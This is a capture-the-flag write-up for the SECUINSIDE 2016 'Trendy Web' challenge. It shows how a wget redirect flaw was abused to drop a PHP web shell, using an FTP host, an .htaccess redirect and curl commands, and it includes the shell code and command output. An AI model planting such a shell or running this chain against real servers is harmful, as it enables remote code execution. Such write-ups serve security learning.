---
layout: post
title: SECUINSIDE 2016 - Trendy Web [WEB]
author: menztrual
tags: [ctf, secuinside, web]
---

 * **Competition**: Secuinside 2016
 * **Challenge** Name: Trendy Web
 * **Type**: Web
 * **Points**: 100 pts
 * **URL**: http://chal.cykor.kr:8082/

<!--more-->

## Challenge Description:

```
Trendy~! Web~
The flag reader is on /.

http://chal.cykor.kr:8082
http://52.78.11.234:8082

p.s.
If the download doesn’t work, try this:
https://gist.github.com/Jinmo/e49dfef9b7325acb12566de3a7f88859

and it requires data/ folder
```


Looking at the provided source code, we can ascertain that this is going to be a remote code execution challenge. So our objectives are as follows:

 1. Upload a malicious .php script to the server
 1. Read the flag that's somewhere inside /


Starting off, my eyes were immediately drawn to an obvious deserialization vulnerability:

```php
function set_context($id) {
    global $_SESSION, $session_path;
    $session_path=getcwd() . '/data/'.$id;
    if(!is_dir($session_path)) mkdir($session_path);
    chdir($session_path);
    if(!is_file('pickle')) $_SESSION = array();
    else $_SESSION = unserialize(file_get_contents('pickle'));
}
```

Unfortunately, I was unable to successfully put a malicious payload inside of "pickle". Failing this, I went back to looking at the following snippets of code:

```php
if(isset($_POST['image'])) download_image($_POST['image']);
function download_image($url) {
    $url = parse_url($origUrl=$url);
    if(isset($url['scheme']) && $url['scheme'] == 'http')
    if($url['path'] == '/avatar.png') {
        system('/usr/bin/wget '.escapeshellarg($origUrl));
    }
}
```

The filename check and the `escapeshellarg` function prevents us from submitting a malicious image url that would execute arbitrary code. There was a recent [vulnerability](https://www.exploit-db.com/exploits/40064/) in wget < 1.18 and because we are in control of where the image is coming from, we can issue a crafted HTTP 30X Redirect to an FTP server that we control to pull down our malicious file.

Firstly, I setup an FTP server that had **anonymous** access enabled. I hosted a file, hello.php that had the contained the following:

```php
<?php
echo '<pre>';
system($_GET['x']);
?>
```

I then added a `.htaccess` on my webserver to redirect requests to avatar.png to my FTP server:

```
Redirect /avatar.png ftp://myftp.server/hello.php
```

Now to see if it worked:

```bash
[menztrual@orion ~]$ curl -X POST http://chal.cykor.kr:8082/ -d "image=http://menztrual.com/avatar.png" -b "PHPSESSID=095en4ci5vnhv8am2plbic4o47"
```

Then by browsing to http://chal.cykor.kr:8082//data/3442561f6d78aaf59afc/hello.php?x=ls%20/ we can see that the upload was successful and we have remote code execution.

```
total 36
drwxr-xr-x.  21 root   root     4096 Jul  9 13:54 .
drwxr-xr-x.  21 root   root     4096 Jul  9 13:54 ..
-rwxr-xr-x.   1 root   root        0 Jul  9 13:54 .dockerenv
drwxr-xr-x.   2 root   root     4096 Jul  9 09:40 bin
drwxr-xr-x.   2 root   root        6 Apr 17  2015 boot
drwxr-xr-x.   5 root   root      360 Jul  9 13:54 dev
drwxr-xr-x.  57 root   root     4096 Jul  9 13:54 etc
---x--x---.   1 root   www-data 6172 Jul  9 08:26 flag_is_heeeeeeeereeeeeee
drwxr-xr-x.   2 root   root        6 Apr 17  2015 home
drwxr-xr-x.   9 root   root     4096 Jul  9 09:40 lib
drwxr-xr-x.   2 root   root       33 Jan 22 07:46 lib64
drwxr-xr-x.   2 root   root        6 Jan 22 07:46 media
drwxr-xr-x.   2 root   root        6 Apr 17  2015 mnt
drwxr-xr-x.   2 root   root        6 Jan 22 07:46 opt
dr-xr-xr-x. 306 nobody nogroup     0 Jul  9 13:54 proc
drwx------.   2 root   root       35 Jan 22 07:47 root
drwxr-xr-x.   6 root   root       90 Jul  9 09:40 run
drwxr-xr-x.   2 root   root     4096 Jul  9 09:40 sbin
drwxr-xr-x.   2 root   root        6 Jan 22 07:46 srv
dr-xr-xr-x.  13 nobody nogroup     0 Jul  9 13:54 sys
drwx-wx-wt.   2 root   root        6 Jul  9 13:54 tmp
drwxr-xr-x.  10 root   root       97 Jan 26 17:48 usr
drwxr-xr-x.  12 root   root     4096 Jul  9 09:40 var
```

We just simply run `/flag_is_heeeeeeeereeeeeee` to obtain our flag to submit.

```bash
[menztrual@orion ~]$ curl http://chal.cykor.kr:8082//data/3442561f6d78aaf59afc/hello.php?x=/flag_is_heeeeeeeereeeeeee

1-day is not trendy enough
```
